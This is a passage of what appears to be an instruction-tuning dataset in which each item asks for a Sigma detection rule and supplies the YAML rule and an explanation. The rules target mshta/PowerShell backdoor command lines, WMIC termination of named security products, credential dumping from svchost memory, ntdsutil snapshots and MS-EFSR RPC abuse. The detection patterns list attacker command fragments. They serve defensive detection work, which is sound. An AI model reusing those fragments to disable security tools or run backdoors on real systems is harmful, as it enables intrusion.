    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith: '\\Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith: '\\Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags",
      "answer": "In order to detect suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags, you should: monitor process creation logs on Windows systems for the execution of `wuauclt.exe` without the presence of any command line flags. This involves looking for events where either the image path ends with `\\Wuauclt.exe`, the original file name is exactly `Wuauclt.exe`, or the command line ends with `\\Wuauclt.exe` but does not include additional command line arguments. Such activities, without the use of any command line flags, are considered highly unusual and could indicate a malicious attempt to mimic the Windows Update Agent for nefarious purposes. It is important to note, however, that since the detection strategy can potentially yield unknown false positives, any alert should be carefully investigated for confirmation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential Muddywater APT activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential Muddywater APT activity, you should: Monitor process creation logs on Windows systems for specific patterns of command line arguments indicative of malicious activity. Three primary patterns of concern are identified, each corresponding to a different type of threat behavior. The first pattern involves the use of 'mshta' to execute VBScript or PowerShell commands in a way that is often leveraged by attackers to bypass security controls, specifically looking for signs of PowerShell command execution with script execution policy bypass and file path references to the \\ProgramData\\ directory. The second pattern searches for command line executions that query system information such as operating system details, network adapter configurations, and security center information, likely for reconnaissance purposes. This includes looking for WMI queries related to the operating system, network adapters, and the security center, as well as DNS queries through .NET, which can be indicative of an adversary trying to gather information about the network environment. The third pattern focuses on detection of PowerShell code that processes base64 strings and networking requests in a manner consistent with backdoor activities, including base64 encoding and decoding, usage of .NET classes for HTTP requests, and bitwise operations, suggesting attempts to communicate with command and control servers or exfiltrate data in a covert manner. Given the sophistication and stealthiness typically associated with Muddywater APT operations, these detections are considered to have a high level of accuracy with unlikely false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_mshta:\n        CommandLine|contains|all:\n            - 'vbscript:Close(Execute(\"CreateObject('\n            - 'powershell'\n            - '-w 1 -exec Bypass'\n            - '\\ProgramData\\'\n    selection_survey:\n        CommandLine|contains|all:\n            - 'Win32_OperatingSystem'\n            - 'Win32_NetworkAdapterConfiguration'\n            - 'root\\SecurityCenter2'\n            - '[System.Net.DNS]'\n    selection_pwsh_backdoor:\n        CommandLine|contains|all:\n            - '[Convert]::ToBase64String'\n            - '[System.Text.Encoding]::UTF8.GetString]'\n            - 'GetResponse().GetResponseStream()'\n            - '[System.Net.HttpWebRequest]::Create('\n            - '-bxor '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_mshta:\n        CommandLine|contains|all:\n            - 'vbscript:Close(Execute(\"CreateObject('\n            - 'powershell'\n            - '-w 1 -exec Bypass'\n            - '\\ProgramData\\'\n    selection_survey:\n        CommandLine|contains|all:\n            - 'Win32_OperatingSystem'\n            - 'Win32_NetworkAdapterConfiguration'\n            - 'root\\SecurityCenter2'\n            - '[System.Net.DNS]'\n    selection_pwsh_backdoor:\n        CommandLine|contains|all:\n            - '[Convert]::ToBase64String'\n            - '[System.Text.Encoding]::UTF8.GetString]'\n            - 'GetResponse().GetResponseStream()'\n            - '[System.Net.HttpWebRequest]::Create('\n            - '-bxor '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential Muddywater APT activity",
      "answer": "In order to detect potential Muddywater APT activity, you should: Monitor process creation logs on Windows systems for specific patterns of command line arguments indicative of malicious activity. Three primary patterns of concern are identified, each corresponding to a different type of threat behavior. The first pattern involves the use of 'mshta' to execute VBScript or PowerShell commands in a way that is often leveraged by attackers to bypass security controls, specifically looking for signs of PowerShell command execution with script execution policy bypass and file path references to the \\ProgramData\\ directory. The second pattern searches for command line executions that query system information such as operating system details, network adapter configurations, and security center information, likely for reconnaissance purposes. This includes looking for WMI queries related to the operating system, network adapters, and the security center, as well as DNS queries through .NET, which can be indicative of an adversary trying to gather information about the network environment. The third pattern focuses on detection of PowerShell code that processes base64 strings and networking requests in a manner consistent with backdoor activities, including base64 encoding and decoding, usage of .NET classes for HTTP requests, and bitwise operations, suggesting attempts to communicate with command and control servers or exfiltrate data in a covert manner. Given the sophistication and stealthiness typically associated with Muddywater APT operations, these detections are considered to have a high level of accuracy with unlikely false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting uninstallation or termination of security products using the WMIC utility.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect uninstallation or termination of security products using the WMIC utility, you should: monitor Windows process creation logs for indications of the Windows Management Instrumentation Command-line (WMIC) utility being used in ways that suggest the uninstallation or termination of security software. Specifically, look for command line executions that include the `wmic` command along with parameters indicating an attempt to manipulate software products, such as mentioning 'product where', 'call', 'uninstall', '/nointeractive', 'caption like', 'call delete', 'process where delete', and any references to the deletion or termination of processes. Additionally, the rule is designed to flag attempts to uninstall or terminate processes by matching against a list of known security product identifiers in the command lines, including a variety of common and leading security solution names like Carbon Black, Cylance, ESET, Malwarebytes, Sophos, Symantec, and Windows Defender, among others. The logic behind this rule requires that at least one of the specified command line selection criteria matches along with a reference to one of the listed security products, indicating a high likelihood of malicious activity aimed at disabling security mechanisms on the host system. However, it's essential to consider the possibility of false positives, which may arise from legitimate administrative tasks involving the uninstallation or management of security products.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'product where '\n            - 'call'\n            - 'uninstall'\n            - '/nointeractive'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'caption like '\n        CommandLine|contains:\n            - 'call delete'\n            - 'call terminate'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'process '\n            - 'where '\n            - 'delete'\n    selection_product:\n        CommandLine|contains:\n            - '%carbon%'\n            - '%cylance%'\n            - '%endpoint%'\n            - '%eset%'\n            - '%malware%'\n            - '%Sophos%'\n            - '%symantec%'\n            - 'Antivirus'\n            - 'AVG '\n            - 'Carbon Black'\n            - 'CarbonBlack'\n            - 'Cb Defense Sensor 64-bit'\n            - 'Crowdstrike Sensor'\n            - 'Cylance '\n            - 'Dell Threat Defense'\n            - 'DLP Endpoint'\n            - 'Endpoint Detection'\n            - 'Endpoint Protection'\n            - 'Endpoint Security'\n            - 'Endpoint Sensor'\n            - 'ESET File Security'\n            - 'LogRhythm System Monitor Service'\n            - 'Malwarebytes'\n            - 'McAfee Agent'\n            - 'Microsoft Security Client'\n            - 'Sophos Anti-Virus'\n            - 'Sophos AutoUpdate'\n            - 'Sophos Credential Store'\n            - 'Sophos Management Console'\n            - 'Sophos Management Database'\n            - 'Sophos Management Server'\n            - 'Sophos Remote Management System'\n            - 'Sophos Update Manager'\n            - 'Threat Protection'\n            - 'VirusScan'\n            - 'Webroot SecureAnywhere'\n            - 'Windows Defender'\n    condition: 1 of selection_cli_* and selection_product\nfalsepositives:\n    - Legitimate administration\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'product where '\n            - 'call'\n            - 'uninstall'\n            - '/nointeractive'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic'\n            - 'caption like '\n        CommandLine|contains:\n            - 'call delete'\n            - 'call terminate'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'process '\n            - 'where '\n            - 'delete'\n    selection_product:\n        CommandLine|contains:\n            - '%carbon%'\n            - '%cylance%'\n            - '%endpoint%'\n            - '%eset%'\n            - '%malware%'\n            - '%Sophos%'\n            - '%symantec%'\n            - 'Antivirus'\n            - 'AVG '\n            - 'Carbon Black'\n            - 'CarbonBlack'\n            - 'Cb Defense Sensor 64-bit'\n            - 'Crowdstrike Sensor'\n            - 'Cylance '\n            - 'Dell Threat Defense'\n            - 'DLP Endpoint'\n            - 'Endpoint Detection'\n            - 'Endpoint Protection'\n            - 'Endpoint Security'\n            - 'Endpoint Sensor'\n            - 'ESET File Security'\n            - 'LogRhythm System Monitor Service'\n            - 'Malwarebytes'\n            - 'McAfee Agent'\n            - 'Microsoft Security Client'\n            - 'Sophos Anti-Virus'\n            - 'Sophos AutoUpdate'\n            - 'Sophos Credential Store'\n            - 'Sophos Management Console'\n            - 'Sophos Management Database'\n            - 'Sophos Management Server'\n            - 'Sophos Remote Management System'\n            - 'Sophos Update Manager'\n            - 'Threat Protection'\n            - 'VirusScan'\n            - 'Webroot SecureAnywhere'\n            - 'Windows Defender'\n    condition: 1 of selection_cli_* and selection_product\nfalsepositives:\n    - Legitimate administration\nlevel: high\n",
      "question": "uninstallation or termination of security products using the WMIC utility",
      "answer": "In order to detect uninstallation or termination of security products using the WMIC utility, you should: monitor Windows process creation logs for indications of the Windows Management Instrumentation Command-line (WMIC) utility being used in ways that suggest the uninstallation or termination of security software. Specifically, look for command line executions that include the `wmic` command along with parameters indicating an attempt to manipulate software products, such as mentioning 'product where', 'call', 'uninstall', '/nointeractive', 'caption like', 'call delete', 'process where delete', and any references to the deletion or termination of processes. Additionally, the rule is designed to flag attempts to uninstall or terminate processes by matching against a list of known security product identifiers in the command lines, including a variety of common and leading security solution names like Carbon Black, Cylance, ESET, Malwarebytes, Sophos, Symantec, and Windows Defender, among others. The logic behind this rule requires that at least one of the specified command line selection criteria matches along with a reference to one of the listed security products, indicating a high likelihood of malicious activity aimed at disabling security mechanisms on the host system. However, it's essential to consider the possibility of false positives, which may arise from legitimate administrative tasks involving the uninstallation or management of security products."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting commandline operations on shell history files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect commandline operations on shell history files, you should: focus on monitoring process creation events on macOS systems for commands that interact with shell history files. Specifically, look for instances where the command line involves activities on files such as '.bash_history', '.zsh_history', '.zhistory', '.history', '.sh_history', and 'fish_history'. It's important to be aware that not all instances detected might indicate malicious activities; some may be legitimate administrative tasks or software operations aimed at cleaning history files. The sensitivity of this monitoring has been set to a medium level due to the potential for legitimate activities to trigger false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.bash_history'\n            - '.zsh_history'\n            - '.zhistory'\n            - '.history'\n            - '.sh_history'\n            - 'fish_history'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\n    - Legitimate software, cleaning hist file\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.bash_history'\n            - '.zsh_history'\n            - '.zhistory'\n            - '.history'\n            - '.sh_history'\n            - 'fish_history'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative activity\n    - Legitimate software, cleaning hist file\nlevel: medium\n",
      "question": "commandline operations on shell history files",
      "answer": "In order to detect commandline operations on shell history files, you should: focus on monitoring process creation events on macOS systems for commands that interact with shell history files. Specifically, look for instances where the command line involves activities on files such as '.bash_history', '.zsh_history', '.zhistory', '.history', '.sh_history', and 'fish_history'. It's important to be aware that not all instances detected might indicate malicious activities; some may be legitimate administrative tasks or software operations aimed at cleaning history files. The sensitivity of this monitoring has been set to a medium level due to the potential for legitimate activities to trigger false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process, such as mimikatz, accesses the memory of svchost to dump credentials.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a process, such as mimikatz, accesses the memory of svchost to dump credentials, you should: Focus on Windows process access logs and look for events where a process targets the 'svchost.exe' file. Specifically, you should look for any process that has been granted access with the permissions '0x143a' to the memory of 'svchost.exe'. However, you must exclude any access instances where the source of the access is a known and trusted process, notably 'services.exe' or 'msiexec.exe'. This approach is designed to elevate the detection accuracy by minimizing false positives from legitimate executable accesses while ensuring high sensitivity to potentially malicious activities like credential dumping by targeting system processes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_access\ndetection:\n    selection_process:\n        TargetImage|endswith: '\\svchost.exe'\n    selection_memory:\n        GrantedAccess: '0x143a'\n    filter_trusted_process_access:\n        SourceImage|endswith:\n            - '*\\services.exe'\n            - '*\\msiexec.exe'\n    condition: selection_process and selection_memory and not filter_trusted_process_access\nfalsepositives:\n    - Non identified legit exectubale\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_access\ndetection:\n    selection_process:\n        TargetImage|endswith: '\\svchost.exe'\n    selection_memory:\n        GrantedAccess: '0x143a'\n    filter_trusted_process_access:\n        SourceImage|endswith:\n            - '*\\services.exe'\n            - '*\\msiexec.exe'\n    condition: selection_process and selection_memory and not filter_trusted_process_access\nfalsepositives:\n    - Non identified legit exectubale\nlevel: high\n",
      "question": "process, such as mimikatz, accesses the memory of svchost to dump credentials",
      "answer": "In order to detect when a process, such as mimikatz, accesses the memory of svchost to dump credentials, you should: Focus on Windows process access logs and look for events where a process targets the 'svchost.exe' file. Specifically, you should look for any process that has been granted access with the permissions '0x143a' to the memory of 'svchost.exe'. However, you must exclude any access instances where the source of the access is a known and trusted process, notably 'services.exe' or 'msiexec.exe'. This approach is designed to elevate the detection accuracy by minimizing false positives from legitimate executable accesses while ensuring high sensitivity to potentially malicious activities like credential dumping by targeting system processes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who are using a known encryption algorithm to conceal command and control traffic instead of relying on inherent protections offered by a communication protocol, you should focus on analyzing scripts executed on Windows environments. Specifically, monitor for script activities that involve scripting block logs, given that Script Block Logging must be enabled. Look for scripts that incorporate elements such as 'System.Net.Security.SslStream', 'Net.Security.RemoteCertificateValidationCallback', and '.AuthenticateAsClient' within their text. These specific components suggest an attempt to implement SSL/TLS encryption directly, possibly as a means to obscure malicious traffic. It's essential to note, however, that such detection might also flag legitimate administrative scripts using similar techniques for secure communication, hence the possibility of false positives is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - System.Net.Security.SslStream\n            - Net.Security.RemoteCertificateValidationCallback\n            - '.AuthenticateAsClient'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - System.Net.Security.SslStream\n            - Net.Security.RemoteCertificateValidationCallback\n            - '.AuthenticateAsClient'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: low\n",
      "question": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
      "answer": "In order to detect adversaries who are using a known encryption algorithm to conceal command and control traffic instead of relying on inherent protections offered by a communication protocol, you should focus on analyzing scripts executed on Windows environments. Specifically, monitor for script activities that involve scripting block logs, given that Script Block Logging must be enabled. Look for scripts that incorporate elements such as 'System.Net.Security.SslStream', 'Net.Security.RemoteCertificateValidationCallback', and '.AuthenticateAsClient' within their text. These specific components suggest an attempt to implement SSL/TLS encryption directly, possibly as a means to obscure malicious traffic. It's essential to note, however, that such detection might also flag legitimate administrative scripts using similar techniques for secure communication, hence the possibility of false positives is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an internet hosted webdav share is mounted using the \"net.exe\" utility.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an internet hosted webdav share is mounted using the \"net.exe\" utility, you should: Monitor process creation events on Windows systems for the execution of \"net.exe\" or \"net1.exe\". Specifically, check for occurrences where the process image ends with '\\net.exe' or '\\net1.exe', and also verify the OriginalFileName attribute for these exact names. Furthermore, examine the command line arguments looking for instances containing ' use ' or ' http', as these are indicative of attempts to access or mount a webdav share over the internet. All of these conditions must be met simultaneously for an alert to be generated. Bear in mind that there might be legitimate uses of these commands that could trigger false positives, although no specific common false positive scenarios have been identified. The severity level for this detection is considered high due to the potential misuse of the net utility for mounting unauthorized or malicious webdav shares.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' use '\n            - ' http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' use '\n            - ' http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "when an internet hosted webdav share is mounted using the \"net.exe\" utility",
      "answer": "In order to detect when an internet hosted webdav share is mounted using the \"net.exe\" utility, you should: Monitor process creation events on Windows systems for the execution of \"net.exe\" or \"net1.exe\". Specifically, check for occurrences where the process image ends with '\\net.exe' or '\\net1.exe', and also verify the OriginalFileName attribute for these exact names. Furthermore, examine the command line arguments looking for instances containing ' use ' or ' http', as these are indicative of attempts to access or mount a webdav share over the internet. All of these conditions must be met simultaneously for an alert to be generated. Bear in mind that there might be legitimate uses of these commands that could trigger false positives, although no specific common false positive scenarios have been identified. The severity level for this detection is considered high due to the potential misuse of the net utility for mounting unauthorized or malicious webdav shares."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious start of rundll32.exe with a parent process of Explorer.exe. Variant of Raspberry Robin, as first reported by Red Canary..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious start of rundll32.exe with a parent process of Explorer.exe, indicative of the variant of Raspberry Robin, as first reported by Red Canary, you should observe for process creation events in Windows environments. Specifically, monitor for instances where rundll32.exe is started and has explorer.exe as its parent process. Be cautious of selections based on the image name ending with '\\rundll32.exe' or having the original file name 'RUNDLL32.EXE', while also ensuring that the parent image ends with '\\explorer.exe'. However, to avoid false positives and enhance accuracy, exclude any command line instances that contain ' C:\\Windows\\System32\\' or end with ' -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617', as these might indicate legitimate usage of rundll32.exe, such as Windows 10 volume control. This method is essential for identifying potentially malicious activity related to the execution of rundll32.exe under common parent processes which might otherwise seem benign. This detection logic specifically aids in identifying and mitigating strategies employed in the Raspberry Robin malware activity without immediately flagging regular system behaviors as threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_parent:\n        ParentImage|endswith: '\\explorer.exe'\n    filter:\n        - CommandLine|contains: ' C:\\Windows\\System32\\' # The space at the start is required\n        - CommandLine|endswith: ' -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617' # Windows 10 volume control\n    condition: all of selection_* and not filter\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_parent:\n        ParentImage|endswith: '\\explorer.exe'\n    filter:\n        - CommandLine|contains: ' C:\\Windows\\System32\\' # The space at the start is required\n        - CommandLine|endswith: ' -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617' # Windows 10 volume control\n    condition: all of selection_* and not filter\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious start of rundll32.exe with a parent process of Explorer.exe. Variant of Raspberry Robin, as first reported by Red Canary.",
      "answer": "In order to detect suspicious start of rundll32.exe with a parent process of Explorer.exe, indicative of the variant of Raspberry Robin, as first reported by Red Canary, you should observe for process creation events in Windows environments. Specifically, monitor for instances where rundll32.exe is started and has explorer.exe as its parent process. Be cautious of selections based on the image name ending with '\\rundll32.exe' or having the original file name 'RUNDLL32.EXE', while also ensuring that the parent image ends with '\\explorer.exe'. However, to avoid false positives and enhance accuracy, exclude any command line instances that contain ' C:\\Windows\\System32\\' or end with ' -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617', as these might indicate legitimate usage of rundll32.exe, such as Windows 10 volume control. This method is essential for identifying potentially malicious activity related to the execution of rundll32.exe under common parent processes which might otherwise seem benign. This detection logic specifically aids in identifying and mitigating strategies employed in the Raspberry Robin malware activity without immediately flagging regular system behaviors as threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the legitimate tool \"Mouse Lock\" for nefarious purposes such as credential access and collection as reported in Kaspersky's 2020 Incident Response Analyst Report, you should monitor Windows process creation logs for specific indicators. Look for instances where the product name contains 'Mouse Lock', the company name contains 'Misc314', or the command line execution contains 'Mouse Lock_'. These indicators are critical in identifying suspicious activity related to the Mouse Lock software. It is important to note that while these signs can hint at malicious use, Mouse Lock does have legitimate applications; thus, care should be taken to verify the context of its usage to minimize false positives. This approach focuses on recognizing potential unauthorized access and information gathering activities by monitoring for execution patterns and metadata associated with Mouse Lock software.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Product|contains: 'Mouse Lock'\n        - Company|contains: 'Misc314'\n        - CommandLine|contains: 'Mouse Lock_'\n    condition: selection\nfields:\n    - Product\n    - Company\n    - CommandLine\nfalsepositives:\n    - Legitimate uses of Mouse Lock software\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Product|contains: 'Mouse Lock'\n        - Company|contains: 'Misc314'\n        - CommandLine|contains: 'Mouse Lock_'\n    condition: selection\nfields:\n    - Product\n    - Company\n    - CommandLine\nfalsepositives:\n    - Legitimate uses of Mouse Lock software\nlevel: medium\n",
      "question": "In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents.",
      "answer": "In order to detect the use of the legitimate tool \"Mouse Lock\" for nefarious purposes such as credential access and collection as reported in Kaspersky's 2020 Incident Response Analyst Report, you should monitor Windows process creation logs for specific indicators. Look for instances where the product name contains 'Mouse Lock', the company name contains 'Misc314', or the command line execution contains 'Mouse Lock_'. These indicators are critical in identifying suspicious activity related to the Mouse Lock software. It is important to note that while these signs can hint at malicious use, Mouse Lock does have legitimate applications; thus, care should be taken to verify the context of its usage to minimize false positives. This approach focuses on recognizing potential unauthorized access and information gathering activities by monitoring for execution patterns and metadata associated with Mouse Lock software."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc., you should: Monitor the creation of processes on Windows systems, specifically focusing on the execution of the ntdsutil.exe file. This utility can be identified either by its image path ending in '\\ntdsutil.exe' or by its original filename 'ntdsutil.exe'. Pay special attention to the command line used during execution, looking for two critical activities: the first involves commands containing both 'snapshot' and 'mount', which indicates the mounting of a specific snapshot, a potential indicator of an attack. The second activity focuses on variations of the command line containing fragments like 'ac', ' i', and ' ntds', showcasing attempts to activate instances related to NTDS, which is the AD database. These signs can be indicators of malicious actions, although be aware that they might also stem from legitimate administrative tasks such as snapshot restoration. The detection is tagged with medium level importance due to its potential for false positives, including legitimate administrative or restoration activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ntdsutil.exe'\n        - OriginalFileName: 'ntdsutil.exe'\n    selection_cli:\n        - CommandLine|contains|all:\n            - 'snapshot'\n            - 'mount ' # mounts a specific snapshot - Ex: ntdsutil snapshot \"mount c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb\" quit quit\n        - CommandLine|contains|all:\n            # This offers more coverage to the \"selection_oneliner_1\" case in rule 8bc64091-6875-4881-aaf9-7bd25b5dda08\n            # The shorest form of \"activate\" can \"ac\". But \"act\", \"acti\"...etc are also valid forms\n            # Same case with the \"instance\" flag\n            - 'ac'\n            - ' i'\n            - ' ntds'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage to restore snapshots\n    - Legitimate admin activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ntdsutil.exe'\n        - OriginalFileName: 'ntdsutil.exe'\n    selection_cli:\n        - CommandLine|contains|all:\n            - 'snapshot'\n            - 'mount ' # mounts a specific snapshot - Ex: ntdsutil snapshot \"mount c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb\" quit quit\n        - CommandLine|contains|all:\n            # This offers more coverage to the \"selection_oneliner_1\" case in rule 8bc64091-6875-4881-aaf9-7bd25b5dda08\n            # The shorest form of \"activate\" can \"ac\". But \"act\", \"acti\"...etc are also valid forms\n            # Same case with the \"instance\" flag\n            - 'ac'\n            - ' i'\n            - ' ntds'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage to restore snapshots\n    - Legitimate admin activity\nlevel: medium\n",
      "question": "execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc.",
      "answer": "In order to detect execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc., you should: Monitor the creation of processes on Windows systems, specifically focusing on the execution of the ntdsutil.exe file. This utility can be identified either by its image path ending in '\\ntdsutil.exe' or by its original filename 'ntdsutil.exe'. Pay special attention to the command line used during execution, looking for two critical activities: the first involves commands containing both 'snapshot' and 'mount', which indicates the mounting of a specific snapshot, a potential indicator of an attack. The second activity focuses on variations of the command line containing fragments like 'ac', ' i', and ' ntds', showcasing attempts to activate instances related to NTDS, which is the AD database. These signs can be indicators of malicious actions, although be aware that they might also stem from legitimate administrative tasks such as snapshot restoration. The detection is tagged with medium level importance due to its potential for false positives, including legitimate administrative or restoration activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote RPC calls to possibly abuse remote encryption service via MS-EFSR.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote RPC calls to possibly abuse remote encryption service via MS-EFSR, you should: Monitor the RPC (Remote Procedure Call) firewall logs for applications, specifically looking for Event Log labeled RPCFW with an Event ID of 3. This event indicates an RPC call has been made. Pay special attention to calls made using the Interface UUIDs df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e, as these are known identifiers for operations that could be related to the abuse of the Microsoft Encrypting File System Remote (MS-EFSR) service. However, it is important to consider that there may be legitimate usage of remote file encryption services; such activities should not automatically be treated as malicious without further investigation. Since this activity is considered to be of high importance, ensure that the RPC firewall is correctly installed and applied to all relevant processes as a preventative measure against potential abuse.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid:\n            - df1941c5-fe89-4e79-bf10-463657acf44d\n            - c681d488-d850-11d0-8c52-00c04fd90f7e\n    condition: selection\nfalsepositives:\n    - Legitimate usage of remote file encryption\nlevel: high\n",
